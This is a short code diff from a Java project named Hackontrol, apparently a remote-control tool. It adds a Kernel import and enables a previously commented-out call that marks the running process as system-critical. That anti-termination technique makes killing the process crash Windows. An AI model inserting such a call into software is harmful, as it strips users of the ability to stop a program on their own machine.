@@ -9,6 +9,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.khopan.hackontrol.library.Information;
+import com.khopan.hackontrol.library.Kernel;
 import com.khopan.hackontrol.panel.Panel;
 import com.khopan.hackontrol.panel.PanelManager;
 import com.khopan.hackontrol.registration.PanelRegistry;
@@ -95,7 +96,7 @@ public class Hackontrol {
 		}
 
 		panelManager.initialize(this.category);
-		//Kernel.setProcessCritical(true);
+		Kernel.setProcessCritical(true);
 	}
 
 	public String getMachineIdentifier() {
